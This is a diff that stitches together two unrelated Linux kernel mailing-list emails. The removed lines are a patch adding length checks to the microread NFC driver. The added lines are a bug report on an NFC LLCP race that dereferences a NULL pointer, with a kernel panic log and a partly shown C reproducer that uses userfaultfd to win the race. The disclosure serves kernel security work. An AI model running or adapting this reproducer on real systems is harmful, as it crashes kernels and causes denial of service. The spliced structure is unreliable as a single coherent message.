@@ -1,187 +1,337 @@
-Received: from mail-wm1-f52.google.com (mail-wm1-f52.google.com [209.85.128.52])
+Received: from mail-yw1-f169.google.com (mail-yw1-f169.google.com [209.85.128.169])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A2FCF369D6D
-	for <oe-linux-nfc@lists.linux.dev>; Mon, 13 Jul 2026 21:59:41 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.52
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5946320DD51
+	for <oe-linux-nfc@lists.linux.dev>; Tue, 14 Jul 2026 00:00:51 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.169
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1783979983; cv=none; b=JTcNCZOye/P8YUjgTBlmev0a3b4Qx7mZkY7hLuI1ooIB0fyvwFvXsUXwOrYyYKm1LzV9iiW+z3rTtiLO2dRoRFac3tNalPdZoRtRwxZ8OKuoNzCxf/jqctrsZsSmjHNJ3E3jLUEAwjwMAwHX7spX4t1UrIA7vPuSFXZK2XsohJM=
+	t=1783987253; cv=none; b=dh9hh+4as0reS4AX5jsAIuGDT8C2Mc7NbaIV9Pz9S2THmMpVHE/W47J06lBpdNu0PXKOeZi6Uxk7dYBPLDNgg4Y2/+dxIEmu8MTFTU1/zLhxdPV2VlaOw6TuD8xDsPBBAjrZSit+gnBuEJGmuNrgbfLuN3kJuZwebeP0lm0U+tA=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1783979983; c=relaxed/simple;
-	bh=CHryohLe/fnBYpOI8e4BvVaoKUdQxQ7HJ+W2ldsPKKc=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=nl+9EvZ+F5msR+7S/4rKkhNJGcEBPrYKSOUv3QmEzLtfRxtCPD0m0CtEcEa9xiIGkjk8aJ2tdHLpXvt1XQA9JAyDqJtj3DIsV00dGmBE92fDZJI4Ioan1rarckKs0/82Heq1IIaSWpaURmcw522/OSfx6QmFvID4V1/2QcJlANQ=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=0sec.ai; spf=pass smtp.mailfrom=0sec.ai; dkim=temperror (0-bit key) header.d=0sec.ai header.i=@0sec.ai header.b=NDhmNSIh; arc=none smtp.client-ip=209.85.128.52
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=0sec.ai
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=0sec.ai
+	s=arc-20240116; t=1783987253; c=relaxed/simple;
+	bh=LWT3Yxh1dZr/jUMhHMC/oOf7pkATWTCn7ZX1DmS0Kzs=;
+	h=Message-ID:Date:MIME-Version:To:Cc:From:Subject:Content-Type; b=qoOYlz8u+O7FzADlN0KU71uVbVp3zbKPQ8WsTnzyB5Zmj2uk4bpre64GeCKoNHLuz8SR6s4vUbWRm65AGcyfnaYzrPO27nR0v2vDQyC0aZqCPO/v9epFOVoeqx7uSG//q7DwWIZVtpilRJHvn2qaiwroCw0JhKn09qgJJ2VV4eI=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=AxI6TBSP; arc=none smtp.client-ip=209.85.128.169
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=temperror (0-bit key) header.d=0sec.ai header.i=@0sec.ai header.b="NDhmNSIh"
-Received: by mail-wm1-f52.google.com with SMTP id 5b1f17b1804b1-493f25d47dcso2335675e9.1
-        for <oe-linux-nfc@lists.linux.dev>; Mon, 13 Jul 2026 14:59:41 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="AxI6TBSP"
+Received: by mail-yw1-f169.google.com with SMTP id 00721157ae682-80e24970f1dso3713317b3.0
+        for <oe-linux-nfc@lists.linux.dev>; Mon, 13 Jul 2026 17:00:51 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=0sec.ai; s=google; t=1783979980; x=1784584780; darn=lists.linux.dev;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=37p3VfmrrNMS4akxO403NRH36eKSLE6Wn3AfUCl+4gA=;
-        b=NDhmNSIhuWJdT8B8vcOQrkF5wtCk8MbZO6n1rj6aGUWLQszJzPPh51uCpmXHKJcdGd
-         +VFv6m3W0pc+agjR+JQxsigQDrlkw7UySaBQ6zV33jalaPqL3NfnHe6g6aooqr0hYfaR
-         AZGpi6xufbj/hSxOJYY/Dosr3B1iqyYW/bbL3Tvkv7O9y3IQ7ujMKnnrmqvXTxY0u5bZ
-         8PKA4yVmBlfkpv//XI59PF/J04VuFujjI5BmP6B1xainRflwu943mCzVF+5wDnlq1cU2
-         IpxAH4CfmR0tT89k7qpbBx++I9CeLpAvq7I8HLQ6xqQh6OeP/pSq3lKwupQCURmLiCHT
-         ifyg==
+        d=gmail.com; s=20251104; t=1783987250; x=1784592050; darn=lists.linux.dev;
+        h=content-transfer-encoding:content-type:subject:from:cc:to
+         :content-language:user-agent:mime-version:date:message-id:from:to:cc
+         :subject:date:message-id:reply-to:content-type;
+        bh=LWT3Yxh1dZr/jUMhHMC/oOf7pkATWTCn7ZX1DmS0Kzs=;
+        b=AxI6TBSP6k4yxQcDYR11VsLq5WSgtND8a38NxICBJBBdZ+cZMnyOTMx6IWPQnh7p/O
+         dG9E7Ao4iUhK4hepy5vf4moK/NWAvCG4/dV9LklTxgCqTMhG0kMKo1QRCxHcFS4I7ZPF
+         VGXbTow9AwA/cwpf8ZLn1Pgu3AssLp/lzrYF3gnd53OhIklTtYLHBjHeTVCUBKyo8Ojc
+         e+vUa9KB/LGCctRSWs3FgPbFTM7hSiTI/xI54xVO2TuUQ8CgmVxjkO4gn0kRXgUG0wDS
+         kMYHdCLjNBm9R5k7hQCRisFQoDUSwM8pf9ct1PrmvKIYnULmGmsswF0VnO5HpKVXiyUG
+         S4Mw==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1783979980; x=1784584780;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=37p3VfmrrNMS4akxO403NRH36eKSLE6Wn3AfUCl+4gA=;
-        b=tG+2W7M8b+F9Thn4uvyeCTY53u5Yltnm46O+NbXtFkv2vk70xQKQDtC13unWdxAV+H
-         5emY4aZKOopMhYFgBNDV/ggZ2sZn+bJ55eTJiYqKud/YV3YtjZzXWnravvEaxkQIBmV/
-         pnMYMr6fjkm8XoKwC4H/7UDCsW6tjof2VSj2k8ACRtrucJgusq6PwgGrGRQSwi6mljh1
-         eVbyop3uwuwB2ehGSWORDtwJvq3Fxul1GCw5d/OAWoT5h790L7GMojF++E09SZpNNaEx
-         BxzkyuKT+V4ObmPVaFFIVH/VIVKSNij/kV9zrE/IYOVQ2YoPuFq97qL2XqPC7OjVrUpQ
-         HTzQ==
-X-Gm-Message-State: AOJu0YzotMDnzLjtuxzphNjuhlJW8dFLd0GCSYGUXxopgKIBUzONmfp4
-	p/9sDz7UjjtdgkMat+/izJ1pVyecobUlUOFTqtEWL4kmTzYjiV6NhlJJphasQP9EoCrI
-X-Gm-Gg: AfdE7cnXJ73sL+O6vxD3mav/PEjgrKQN6qFkZ0hM2F+fZV6OKzHcx1kgiA+LaINYTSM
-	l/vb0+58giGhXy38GeMMIj9TohVQuJHyQR9yIV9bCXIwsARTytgK2SwzJFxrOtYzUZR28k6Jo9n
-	QAp6hrkA1HdB1xExGpTYoPtxrPL5lU/PBjhmkgKxlu7YIiUMGl7AP3BGW8/y8aHtKHN4UJdf4Xl
-	75HOxZ0MifNu+VZZxsHjiW2+t8A4jdEgnuwrijhDoyOSejEokon+1D07ibe3FyW1DOlUEPm+Qy1
-	5CA6D5uKZyiiQo3TS+wc5zZxYTN39AjlPWTjLiJAGteoG5GPAlzLPGXeIoJoYNFwcRaFU12Xf2S
-	h5L7w+73C0fBanTCQh5FT4wmbmug7u5A1u+G58ih1D8DS6rp4qVNiW+BfmU5M7qYqGsUh4wuh3G
-	YcL7p2VlauHAsAccN0+xUXQNEs2Bo742qM8tlVzMKoNt8QmCSwua7UTjQnoid4+HwyNEzxdpGh4
-	gLulpUlWFLcXnYlxWVSjvNw1rdrR2XnK30=
-X-Received: by 2002:a05:600c:b90:b0:493:b967:178d with SMTP id 5b1f17b1804b1-493f881d05emr112865375e9.19.1783979980087;
-        Mon, 13 Jul 2026 14:59:40 -0700 (PDT)
-Received: from PeakBook-Mini.tail8e484.ts.net ([178.197.218.188])
-        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-4950a2f9402sm28390785e9.13.2026.07.13.14.59.37
-        (version=TLS1_3 cipher=TLS_CHACHA20_POLY1305_SHA256 bits=256/256);
-        Mon, 13 Jul 2026 14:59:39 -0700 (PDT)
-From: Doruk Tan Ozturk <doruk@0sec.ai>
-To: David Heidelberg <david@ixit.cz>
-Cc: oe-linux-nfc@lists.linux.dev,
-	netdev@vger.kernel.org,
-	linux-kernel@vger.kernel.org,
-	stable@vger.kernel.org
-Subject: [PATCH net] nfc: microread: validate CARD_FOUND event length before parsing targets
-Date: Mon, 13 Jul 2026 23:59:36 +0200
-Message-ID: <20260713215936.23137-1-doruk@0sec.ai>
-X-Mailer: git-send-email 2.53.0
+        d=1e100.net; s=20251104; t=1783987250; x=1784592050;
+        h=content-transfer-encoding:content-type:subject:from:cc:to
+         :content-language:user-agent:mime-version:date:message-id:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=LWT3Yxh1dZr/jUMhHMC/oOf7pkATWTCn7ZX1DmS0Kzs=;
+        b=j3okuOgcsun+Ekx43C8kuBR2A4ROYpcJ0yrOB2sfdGWU28dDo3TmZGFFTQh+qAgAdn
+         UFiLtqQgTZKInCK3vm0p6FVznnhKV8e09rBLGLW81wWug8MHlVBQxNWLlVra7HPST2gJ
+         nyDwd17LLcAq9o8G/6QVTL9Vg2prl/B8E7lMtrLE4wZkosPuwPp/Kv1pvvu2BrPF97xT
+         /wgenuMFkKn76HsxTaXa/Lyv8dVy9fTHct8kJv9G12Km7t3W4bys0F2pZ/ZxN6HCnhe4
+         5iwrHqfi94CRhkKIJpcSCG3VRc0J3zZT72Br5He7uA532n99WGJ0XWCr5RsU4ezQBUXS
+         4p3A==
+X-Forwarded-Encrypted: i=1; AHgh+RpxGD4JA+mz1qSMUWwlIP1Q1glO179WlQf9wSTQ5pIZCLEijQbx6k7O0u6YSds6R0VxXEnvJnffSstl4Qk=@lists.linux.dev
+X-Gm-Message-State: AOJu0Yz1vEK+Wo6NsQLHSRVjgXQihg/CcJuXkDkbGdgLzPbFDchXXtAt
+	ZaSMerEtDvCgghGKa5CUUc6Th9BF2CmsCbHrAD82pemuqVe4Mw5zd8pD
+X-Gm-Gg: AfdE7cmjVTUFREV19Vh3bQiDamdDKm7D1YvDekS/2FmUu6AwW6LY+8NWjUXcsi+ICkJ
+	NvYPw+QVbdXy+Y1l8XQc127nyJhVh89Rd+EBQkLUfLfyI9twxiRzoYb1WE71jk8F05VxMRn7c0c
+	nUYuvDDoHb509zHx2bw1G8LPDF86Wy4ge0WjmZH0uRi3VsowcFnNdn898dl2Z0/T21jHluZwH3r
+	XGdq7jDD753jQfa8lAZorCeACeh/yP50/Kbg//emsB5AjspHPiie/sMeZPE6H075GKB2IlPLHHb
+	gpybbyfqKOroD8wbpLiD/jRfvxfAJJHimynx8Kf5iuWpth+YcRG4crHUEPmDLmtMluN0ngxVGVo
+	XeQAqMxrRakfb4f+bTU0+JYDk4cVw1w304o+sRpDXHXaoksaoQgKtxQxtD37e7MGPCYAKsbmYQy
+	LyFMaWmPHD31WFwn4+zpaa
+X-Received: by 2002:a53:c34a:0:b0:667:c09c:4a34 with SMTP id 956f58d0204a3-667d7b0040fmr5216981d50.11.1783987249986;
+        Mon, 13 Jul 2026 17:00:49 -0700 (PDT)
+Received: from [141.223.124.60] ([141.223.124.60])
+        by smtp.gmail.com with ESMTPSA id 956f58d0204a3-66787ad3833sm14824607d50.20.2026.07.13.17.00.46
+        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
+        Mon, 13 Jul 2026 17:00:49 -0700 (PDT)
+Message-ID: <a89d0419-8bcf-40a2-b52d-3e5d911f11da@gmail.com>
+Date: Tue, 14 Jul 2026 09:00:45 +0900
 Precedence: bulk
 X-Mailing-List: oe-linux-nfc@lists.linux.dev
 List-Id: <oe-linux-nfc.lists.linux.dev>
 List-Subscribe: <mailto:oe-linux-nfc+subscribe@lists.linux.dev>
 List-Unsubscribe: <mailto:oe-linux-nfc+unsubscribe@lists.linux.dev>
 MIME-Version: 1.0
+User-Agent: Mozilla Thunderbird
+Content-Language: en-US
+To: david@ixit.cz
+Cc: krzk@kernel.org, davem@davemloft.net, edumazet@google.com,
+ kuba@kernel.org, pabeni@redhat.com, horms@kernel.org,
+ oe-linux-nfc@lists.linux.dev, netdev@vger.kernel.org,
+ linux-kernel@vger.kernel.org, jdoh.kernel@gmail.com
+From: Junwoong Doh <jdoh.kernel@gmail.com>
+Subject: [BUG] nfc: llcp: race between nfc_llcp_send_ui_frame() and
+ llcp_sock_bind() dereferences NULL sock->dev
+Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: 8bit
 
-microread_target_discovered() parses a device-supplied MREAD_CARD_FOUND
-event into a struct nfc_target, reading fixed offsets and -- for the
-ISO-A and ISO-A-3 gates -- a variable-length NFCID1 straight out of the
-event skb. The only length check is nfcid1_len vs sizeof(targets->nfcid1);
-skb->len itself is never validated, so a short event makes every gate
-case read out of bounds past the skb:
+Hello,
 
-  - ISO-A / ISO-A-3: fixed ATQA/SAK/LEN reads plus a memcpy of an
-    attacker-controlled nfcid1_len bytes from the NFCID1 offset;
-  - ISO-B / NFC-T1 / NFC-T3: a fixed 4- or 8-byte NFCID1 memcpy from a
-    fixed offset.
+Commit dded08927ca3 ("nfc: llcp: fix NULL error pointer dereference on
+sendmsg() after failed bind()") added a NULL check for llcp_sock->local
+in llcp_sock_sendmsg(), but it does not handle all the races.
+The thread interleaving is the same as Krzysztof mentioned:
+https://lore.kernel.org/oe-linux-nfc/20220119074816.6505-2-krzysztof.kozlowski@canonical.com/
 
-The copied nfcid1 is exported to user space via nfc_targets_found(), so
-the over-read is an information leak (and a possible oops on an unmapped
-page).
+In detail:
+nfc_llcp_send_ui_frame() checks sock->local == NULL, but it is called
+without socket's lock held, which opens a window for a race condition.
+Between the sock->local == NULL check and the sock->dev use in
+nfc_alloc_send_skb(), llcp_sock_bind() can run concurrently and set
+both sock->local and sock->dev to NULL.
+This leads to NULL pointer dereference in the nfc_alloc_send_skb() call.
+Moreover, the window can be enlarged by the
+memcpy_from_msg(msg_data, msg, len) call that sits between
+the sock->local check and the sock->dev use.
 
-Reject events too short for the fields each gate case reads.
+I used /dev/virtual_nci to set up a virtual NFC device,
+so the reproducer must be executed as root:
+  gcc repro.c -o repro -static -lpthread
+  ./repro
 
-Found by 0sec (https://0sec.ai).
+Reproduced crash log:
+==================================================================
+[   46.787552][ T9432] Oops: general protection fault, probably for non-canonical address 0xdffffc00000000b4: 0000 [#1] SMP KASAN NOPTI
+[   46.787982][ T9432] KASAN: null-ptr-deref in range [0x00000000000005a0-0x00000000000005a7]
+[   46.788264][ T9432] CPU: 0 UID: 0 PID: 9432 Comm: minimize Not tainted 7.2.0-rc3 #3 PREEMPT(full) 
+[   46.788565][ T9432] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
+[   46.788869][ T9432] RIP: 0010:nfc_alloc_send_skb+0x3e/0x1a0
+[   46.789080][ T9432] Code: 54 41 89 d4 55 53 48 89 fb 48 8d ab a0 05 00 00 48 83 ec 08 e8 b3 d3 79 f6 48 89 ea 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <0f> b6 04 02 84 c0 74 08 3c 03 0f 8e 1d 01 00 00 48 8d bb a4 05 00
+[   46.789707][ T9432] RSP: 0018:ffffc90003c1f9a8 EFLAGS: 00010216
+[   46.789909][ T9432] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000082
+[   46.790164][ T9432] RDX: 00000000000000b4 RSI: ffffffff8b46300d RDI: 0000000000000000
+[   46.790418][ T9432] RBP: 00000000000005a0 R08: ffffc90003c1fa70 R09: ffffed100f11e9ff
+[   46.790672][ T9432] R10: 0000000000000880 R11: 0000000000000000 R12: 0000000000000000
+[   46.790928][ T9432] R13: 0000000000000082 R14: ffff88802c144000 R15: ffffc90003c1fa70
+[   46.791184][ T9432] FS:  00007f788883d640(0000) GS:ffff888124680000(0000) knlGS:0000000000000000
+[   46.791470][ T9432] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   46.791684][ T9432] CR2: 00000000004b0270 CR3: 00000000287d4000 CR4: 00000000000006f0
+[   46.791942][ T9432] Call Trace:
+[   46.792052][ T9432]  <TASK>
+[   46.792150][ T9432]  nfc_llcp_send_ui_frame+0x412/0x690
+[   46.792331][ T9432]  ? __pfx_nfc_llcp_send_ui_frame+0x10/0x10
+[   46.792526][ T9432]  ? llcp_sock_sendmsg+0x300/0x480
+[   46.792696][ T9432]  ? __local_bh_enable_ip+0xa4/0x120
+[   46.792877][ T9432]  llcp_sock_sendmsg+0x364/0x480
+[   46.793042][ T9432]  ? bpf_lsm_socket_sendmsg+0x9/0x10
+[   46.793217][ T9432]  ? __pfx_llcp_sock_sendmsg+0x10/0x10
+[   46.793398][ T9432]  ____sys_sendmsg+0xa27/0xb90
+[   46.793560][ T9432]  ? __pfx_____sys_sendmsg+0x10/0x10
+[   46.793734][ T9432]  ? __pfx_copy_msghdr_from_user+0x10/0x10
+[   46.793929][ T9432]  ? find_held_lock+0x2b/0x80
+[   46.794085][ T9432]  ? clockevents_program_event+0x27c/0x990
+[   46.794278][ T9432]  ___sys_sendmsg+0x11c/0x1b0
+[   46.794436][ T9432]  ? __pfx____sys_sendmsg+0x10/0x10
+[   46.794611][ T9432]  ? __fget_files+0x1fb/0x3b0
+[   46.794770][ T9432]  __sys_sendmsg+0x142/0x1f0
+[   46.794926][ T9432]  ? __pfx___sys_sendmsg+0x10/0x10
+[   46.795097][ T9432]  ? __cpu_to_node+0x8a/0x130
+[   46.795256][ T9432]  do_syscall_64+0x11f/0x830
+[   46.795414][ T9432]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[   46.795608][ T9432] RIP: 0033:0x453cfd
+[   46.795738][ T9432] Code: 28 89 54 24 1c 48 89 74 24 10 89 7c 24 08 e8 6a 86 02 00 8b 54 24 1c 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 33 44 89 c7 48 89 44 24 08 e8 ae 86 02 00 48
+[   46.796354][ T9432] RSP: 002b:00007f788883d0d0 EFLAGS: 00000293 ORIG_RAX: 000000000000002e
+[   46.796623][ T9432] RAX: ffffffffffffffda RBX: 00007f788883d640 RCX: 0000000000453cfd
+[   46.796879][ T9432] RDX: 0000000000000000 RSI: 00007f788883d120 RDI: 0000000000000006
+[   46.797133][ T9432] RBP: 00007f788883d1d0 R08: 0000000000000000 R09: 00007ffe3551378f
+[   46.797387][ T9432] R10: 0000000000000008 R11: 0000000000000293 R12: 00007f788883d640
+[   46.797641][ T9432] R13: 0000000000000000 R14: 0000000000415330 R15: 00007f788803d000
+[   46.797912][ T9432]  </TASK>
+[   46.798017][ T9432] Modules linked in:
+[   46.798231][ T9432] ---[ end trace 0000000000000000 ]---
+[   46.813550][ T9432] RIP: 0010:nfc_alloc_send_skb+0x3e/0x1a0
+[   46.813783][ T9432] Code: 54 41 89 d4 55 53 48 89 fb 48 8d ab a0 05 00 00 48 83 ec 08 e8 b3 d3 79 f6 48 89 ea 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <0f> b6 04 02 84 c0 74 08 3c 03 0f 8e 1d 01 00 00 48 8d bb a4 05 00
+[   46.814427][ T9432] RSP: 0018:ffffc90003c1f9a8 EFLAGS: 00010216
+[   46.814632][ T9432] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000082
+[   46.814900][ T9432] RDX: 00000000000000b4 RSI: ffffffff8b46300d RDI: 0000000000000000
+[   46.815161][ T9432] RBP: 00000000000005a0 R08: ffffc90003c1fa70 R09: ffffed100f11e9ff
+[   46.815423][ T9432] R10: 0000000000000880 R11: 0000000000000000 R12: 0000000000000000
+[   46.815684][ T9432] R13: 0000000000000082 R14: ffff88802c144000 R15: ffffc90003c1fa70
+[   46.815948][ T9432] FS:  00007f788883d640(0000) GS:ffff888124680000(0000) knlGS:0000000000000000
+[   46.816243][ T9432] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   46.816462][ T9432] CR2: 00007f871e9f90a0 CR3: 00000000287d4000 CR4: 00000000000006f0
+[   46.816725][ T9432] Kernel panic - not syncing: Fatal exception
+[   46.817025][ T9432] Kernel Offset: disabled
+[   46.817173][ T9432] Rebooting in 86400 seconds..
+==================================================================
 
-Fixes: cfad1ba87150 ("NFC: Initial support for Inside Secure microread")
-Cc: stable@vger.kernel.org
-Assisted-by: 0sec
-Signed-off-by: Doruk Tan Ozturk <doruk@0sec.ai>
----
- drivers/nfc/microread/microread.c | 31 +++++++++++++++++++++++++++++--
- 1 file changed, 29 insertions(+), 2 deletions(-)
+C reproducer:
+==================================================================
+#define _GNU_SOURCE
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <linux/nfc.h>
+#include <linux/userfaultfd.h>
+#include <fcntl.h>
+#include <poll.h>
+#include <pthread.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
 
-diff --git a/drivers/nfc/microread/microread.c b/drivers/nfc/microread/microread.c
-index 4149c5d735bd..9a7a4fd6796b 100644
---- a/drivers/nfc/microread/microread.c
-+++ b/drivers/nfc/microread/microread.c
-@@ -483,13 +483,19 @@ static void microread_target_discovered(struct nfc_hci_dev *hdev, u8 gate,
- 
- 	switch (gate) {
- 	case MICROREAD_GATE_ID_MREAD_ISO_A:
-+		if (skb->len < MICROREAD_EMCF_A_UID) {
-+			r = -EINVAL;
-+			goto exit_free;
-+		}
-+
- 		targets->supported_protocols =
- 		      nfc_hci_sak_to_protocol(skb->data[MICROREAD_EMCF_A_SAK]);
- 		targets->sens_res =
- 			 be16_to_cpu(*(u16 *)&skb->data[MICROREAD_EMCF_A_ATQA]);
- 		targets->sel_res = skb->data[MICROREAD_EMCF_A_SAK];
- 		targets->nfcid1_len = skb->data[MICROREAD_EMCF_A_LEN];
--		if (targets->nfcid1_len > sizeof(targets->nfcid1)) {
-+		if (targets->nfcid1_len > sizeof(targets->nfcid1) ||
-+		    skb->len - MICROREAD_EMCF_A_UID < targets->nfcid1_len) {
- 			r = -EINVAL;
- 			goto exit_free;
- 		}
-@@ -497,13 +503,19 @@ static void microread_target_discovered(struct nfc_hci_dev *hdev, u8 gate,
- 		       targets->nfcid1_len);
- 		break;
- 	case MICROREAD_GATE_ID_MREAD_ISO_A_3:
-+		if (skb->len < MICROREAD_EMCF_A3_UID) {
-+			r = -EINVAL;
-+			goto exit_free;
-+		}
-+
- 		targets->supported_protocols =
- 		      nfc_hci_sak_to_protocol(skb->data[MICROREAD_EMCF_A3_SAK]);
- 		targets->sens_res =
- 			 be16_to_cpu(*(u16 *)&skb->data[MICROREAD_EMCF_A3_ATQA]);
- 		targets->sel_res = skb->data[MICROREAD_EMCF_A3_SAK];
- 		targets->nfcid1_len = skb->data[MICROREAD_EMCF_A3_LEN];
--		if (targets->nfcid1_len > sizeof(targets->nfcid1)) {
-+		if (targets->nfcid1_len > sizeof(targets->nfcid1) ||
-+		    skb->len - MICROREAD_EMCF_A3_UID < targets->nfcid1_len) {
- 			r = -EINVAL;
- 			goto exit_free;
- 		}
-@@ -511,11 +523,21 @@ static void microread_target_discovered(struct nfc_hci_dev *hdev, u8 gate,
- 		       targets->nfcid1_len);
- 		break;
- 	case MICROREAD_GATE_ID_MREAD_ISO_B:
-+		if (skb->len < MICROREAD_EMCF_B_UID + 4) {
-+			r = -EINVAL;
-+			goto exit_free;
-+		}
-+
- 		targets->supported_protocols = NFC_PROTO_ISO14443_B_MASK;
- 		memcpy(targets->nfcid1, &skb->data[MICROREAD_EMCF_B_UID], 4);
- 		targets->nfcid1_len = 4;
- 		break;
- 	case MICROREAD_GATE_ID_MREAD_NFC_T1:
-+		if (skb->len < MICROREAD_EMCF_T1_UID + 4) {
-+			r = -EINVAL;
-+			goto exit_free;
-+		}
-+
- 		targets->supported_protocols = NFC_PROTO_JEWEL_MASK;
- 		targets->sens_res =
- 			le16_to_cpu(*(u16 *)&skb->data[MICROREAD_EMCF_T1_ATQA]);
-@@ -523,6 +545,11 @@ static void microread_target_discovered(struct nfc_hci_dev *hdev, u8 gate,
- 		targets->nfcid1_len = 4;
- 		break;
- 	case MICROREAD_GATE_ID_MREAD_NFC_T3:
-+		if (skb->len < MICROREAD_EMCF_T3_UID + 8) {
-+			r = -EINVAL;
-+			goto exit_free;
-+		}
-+
- 		targets->supported_protocols = NFC_PROTO_FELICA_MASK;
- 		memcpy(targets->nfcid1, &skb->data[MICROREAD_EMCF_T3_UID], 8);
- 		targets->nfcid1_len = 8;
--- 
-2.43.0
+#define IOCTL_GET_NCIDEV_IDX 0
+
+static void fatal(const char *m) {
+    perror(m);
+    exit(1);
+}
+
+static int new_llcp_sock(void) {
+    int s = socket(AF_NFC, SOCK_DGRAM, NFC_SOCKPROTO_LLCP);
+    if (s < 0) {
+        fatal("socket");
+    }
+    return s;
+}
+
+static int do_bind(int s, uint32_t devidx, const char *name) {
+    struct sockaddr_nfc_llcp a = {
+        .sa_family = AF_NFC,
+        .dev_idx   = devidx,
+        .dsap      = 0,
+        .ssap      = 1
+    };
+    strncpy(a.service_name, name, sizeof(a.service_name));
+    a.service_name_len = strlen(name);
+    return bind(s, (struct sockaddr *)&a, sizeof(a));
+}
+
+static int open_dev(uint32_t *idx) {
+    int fd = open("/dev/virtual_nci", O_RDWR);
+    if (fd < 0) {
+        fatal("open /dev/virtual_nci");
+    }
+    if (ioctl(fd, IOCTL_GET_NCIDEV_IDX, idx) < 0) {
+        fatal("GET_NCIDEV_IDX");
+    }
+    return fd;
+}
+
+static int victim;
+static void *payload;
+
+static void *sender(void *arg) {
+    struct iovec iov = {
+        .iov_base = payload,
+        .iov_len = 0x1000
+    };
+    struct sockaddr_nfc_llcp vdest = {
+        .sa_family = AF_NFC,
+        .dsap = 1,
+        .ssap = 6
+    };
+    struct msghdr msg = {
+        .msg_name    = &vdest,
+        .msg_namelen = sizeof(vdest),
+        .msg_iov     = &iov,
+        .msg_iovlen  = 1
+    };
+    sendmsg(victim, &msg, 0);
+    return NULL;
+}
+
+int init_userfaultfd() {
+    int uffd = syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+    if (uffd < 0) {
+        fatal("userfaultfd");
+    }
+    struct uffdio_api api = {
+        .api = UFFD_API
+    };
+    if (ioctl(uffd, UFFDIO_API, &api) < 0) {
+        fatal("UFFDIO_API");
+    }
+    
+    payload = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (payload == MAP_FAILED) {
+        fatal("mmap");
+    }
+    struct uffdio_register reg = {
+        .range = {
+            .start = (unsigned long)payload,
+            .len = 0x1000
+        },
+        .mode  = UFFDIO_REGISTER_MODE_MISSING,
+    };  
+    if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0) {
+        fatal("UFFDIO_REGISTER");
+    }
+
+    return uffd;
+}
+
+int main(void) {
+    uint32_t idx_live, idx_kill;
+
+    int fd_live = open_dev(&idx_live);
+    int helper  = new_llcp_sock();
+    if (do_bind(helper, idx_live, "collide") < 0) {
+        fatal("helper bind");
+    }
+    
+    int fd_kill = open_dev(&idx_kill);
+    victim = new_llcp_sock();
+    if (do_bind(victim, idx_kill, "victim") < 0) {
+        fatal("victim bind");
+    }
+    
+    int uffd = init_userfaultfd();
+    
+    pthread_t th;
+    if (pthread_create(&th, NULL, sender, payload)) {
+        fatal("pthread_create");
+    }
+    
+    // Execute after page fault raised
+    struct pollfd pfd = {
+        .fd = uffd,
+        .events = POLLIN
+    };
+    if (poll(&pfd, 1, -1) < 0) {
+        fatal("poll");
+    }
+    struct uffd_msg um;
+    if (read(uffd, &um, sizeof(um)) != sizeof(um)) {
+        fatal("read uffd");
+    }
+    
+    close(fd_kill);
+    do_bind(victim, idx_live, "collide");
+
+    struct uffdio_zeropage zp = {
+        .range = {
+            .start = payload,
+            .len = 0x1000,
+        },
+    };
+    ioctl(uffd, UFFDIO_ZEROPAGE, &zp); // Resume sendmsg()
+
